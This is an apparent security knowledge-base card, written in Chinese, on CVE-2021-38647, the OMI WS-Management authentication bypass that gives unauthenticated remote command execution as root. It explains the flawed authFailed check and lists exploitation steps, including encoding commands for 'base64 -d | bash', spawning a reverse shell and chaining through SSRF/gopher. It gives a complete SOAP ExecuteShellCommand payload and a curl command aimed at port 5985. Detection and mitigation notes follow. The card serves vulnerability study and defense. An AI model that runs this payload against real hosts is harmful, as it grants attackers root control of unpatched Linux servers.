---
id: web-generic-auth-omi-wsman-missing-authorization-root-rce
title: OMI WS-Management 认证绕过：不带 Authorization 头即被当作已认证并 root 执行命令（CVE-2021-38647）
type: scenario
domain: web
path: web/generic/auth
technique: omi-wsman-missing-authorization-bypass
tags:
- omi
- wsman
- soap
- auth-bypass
- rce
- linux
- cve-2021-38647
cve:
- CVE-2021-38647
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: OMI：affected from 16.0 before OMI Version 1.6.8-1（原文标记；1.6.8-1 于 2021-09-08 发布修复）
verification:
  verified_by: verifier-V65
  verified_at: '2026-11-05T11:58:55+08:00'
  notes: 已对照全文与图16-18核对：CVE-2021-38647，HackerOne 产品状态为 affected from 16.0 before OMI Version 1.6.8-1（图17），v1.6.8-1 于 2021-09-08 发布且 Release Notes 为 Security related fix（图18）；正文给出不带 Authorization 的 authFailed 逻辑与 ExecuteShellCommand SOAP，并在 Jarmis 靶机经 SSRF/gopher 打通取得 root shell。affected_versions 与原文标记一致。未验证点：OMI 直连 PoC 未在本机执行；卡内 SOAP 为删减版（省略未使用的 h/n 命名空间声明），核心字段与原文一致。frontmatter 无 sources/source_url（全库惯例）。
url: /docs/web/generic/auth/web-generic-auth-omi-wsman-missing-authorization-root-rce/
draft: false
kb_aliases:
- CVE-2021-38647
- OMI 认证绕过
- Open Management Infrastructure RCE
- WS-Management ExecuteShellCommand
- OMI 5985 未授权 RCE
---

## 一句话结论

OMI（Open Management Infrastructure）的 WS-Management 服务在请求**不带 `Authorization` 头**时不会触发认证流程，内部 `authFailed` 保持初始 `false`，请求被当作已认证用户处理；攻击者向 5985/5986 发送一个不带 Authorization 的 SOAP `ExecuteShellCommand` 请求，即可在 OMI 默认的 root 权限下执行任意命令（CVE-2021-38647）。

## 原理

- OMI 是 Linux 上的管理服务，默认协议为 WS-Management（WSMan），基于 SOAP/XML over HTTP(S)，默认监听 5985（HTTP）/5986（HTTPS）。
- 漏洞出在授权检查逻辑：
  ```c
  if (handler->recvHeaders.authorization) {
      // 处理已认证请求
  } else {
      if (handler->authFailed) {
          handler->httpErrorCode = HTTP_ERROR_CODE_UNAUTHORIZED; // 401
      }
      // 请求被当作已认证用户处理
  }
  ```
- `authFailed` 初始为 `false`，只有在“经历过一次认证流程并失败”后才会置为 `true`，认证成功后又恢复 `false`。攻击者从一开始就不发送 `Authorization` 头，认证流程根本不会触发，`authFailed` 保持 `false`，于是请求直接进入“已认证”分支。
- OMI 默认以 root 运行，认证绕过后的 `ExecuteShellCommand` 等操作都以 root 权限执行，形成未授权远程 root 命令执行。
- SOAP 请求的 `<Header>` 中不需要任何认证信息；只要 `ResourceURI`、`Action`、`SelectorSet` 等字段正确，`<Body>` 里的 `ExecuteShellCommand_INPUT` 就会执行 `<p:command>` 中的命令。

## 触发条件

- 目标运行未安装 2021-09-08 安全修复的 OMI（原文标记：affected from 16.0 before OMI Version 1.6.8-1）；
- 攻击者能访问 5985（HTTP）或 5986（HTTPS）；
- OMI 服务以 root（或高权限）运行；
- 能发送 SOAP/WSMan 请求（直接访问、内网横向、SSRF/gopher 均可）。

## 利用步骤

1. 发现 5985/5986 端口；5986 是 WinRM over HTTPS 的对应端口，在 Linux 上通常是 OMI。
2. 构造 SOAP `ExecuteShellCommand` 请求，`<s:Header>` 中不添加 `Authorization`。
3. 在 `<p:command>` 中放入命令；为避免特殊字符编码问题，可把命令 base64 编码后用 `base64 -d | bash` 执行。
4. 通过 HTTP（5985）直接 POST SOAP；若只有 5986，需要 TLS 通道（直接请求或通过支持 TLS 的代理）。
5. 观察命令输出或反弹 Shell；默认权限为 root。

## PoC

```xml
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
            xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
            xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"
            xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd">
  <s:Header>
    <a:To>HTTP://127.0.0.1:5985/wsman/</a:To>
    <w:ResourceURI s:mustUnderstand="true">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI>
    <a:ReplyTo>
      <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
    </a:ReplyTo>
    <a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteShellCommand</a:Action>
    <w:MaxEnvelopeSize s:mustUnderstand="true">102400</w:MaxEnvelopeSize>
    <a:MessageID>uuid:0AB58087-C2C3-0005-0000-000000010000</a:MessageID>
    <w:OperationTimeout>PT1M30S</w:OperationTimeout>
    <w:Locale xml:lang="en-us" s:mustUnderstand="false"/>
    <p:DataLocale xml:lang="en-us" s:mustUnderstand="false"/>
    <w:OptionSet s:mustUnderstand="true"/>
    <w:SelectorSet>
      <w:Selector Name="__cimnamespace">root/scx</w:Selector>
    </w:SelectorSet>
  </s:Header>
  <s:Body>
    <p:ExecuteShellCommand_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
      <p:command>id</p:command>
      <p:timeout>0</p:timeout>
    </p:ExecuteShellCommand_INPUT>
  </s:Body>
</s:Envelope>
```

```bash
# 5985 直接 POST（不带 Authorization）
curl -s -X POST http://target:5985/wsman/ \
  -H 'Content-Type: application/soap+xml;charset=UTF-8' \
  --data-binary @omi.xml
```

## 变体与关联

- 变体：只有 5986 时，可直连 HTTPS 发送 SOAP；若通过 SSRF/gopher 只能发明文，则优先寻找 5985。
- 变体：通过 SSRF 重定向到 gopher，把 SOAP 报文作为原始 TCP 数据发到 localhost:5985，可从外部 Web 漏洞跳到 OMI（见关联卡）。
- 变体：除 `ExecuteShellCommand` 外，还可调用其他 CIM 方法读取系统信息、管理服务。
- 关联：[[web-generic-ssrf-redirect-gopher-localhost-portscan-omi]]（SSRF 端口扫描 + 重定向 gopher 打 OMI 的完整链）。
- 影响边界：OMI 已升级到 1.6.8-1 及以上、5985/5986 不可达、或服务以低权限运行时，本漏洞不可用或影响降低。

## 检测与防御

- 检测：5985/5986 上出现不带 `Authorization` 头的 WSMan/SOAP 请求；`ExecuteShellCommand` 调用；异常 `base64 -d | bash` 命令；OMI 进程以 root 运行且产生子进程。
- 检测：外部 Web 服务对 localhost:5985 的异常连接（SSRF 链）；出站/横向流量中出现 5985/5986。
- 防御：升级 OMI 到 1.6.8-1 及以上（2021-09-08 安全修复）；限制 5985/5986 只对管理网开放，禁止公网/业务网访问。
- 防御：OMI 不要以 root 运行，使用低权限服务账户；对 WSMan 请求做认证代理/mTLS；监控未认证的 WSMan 请求。
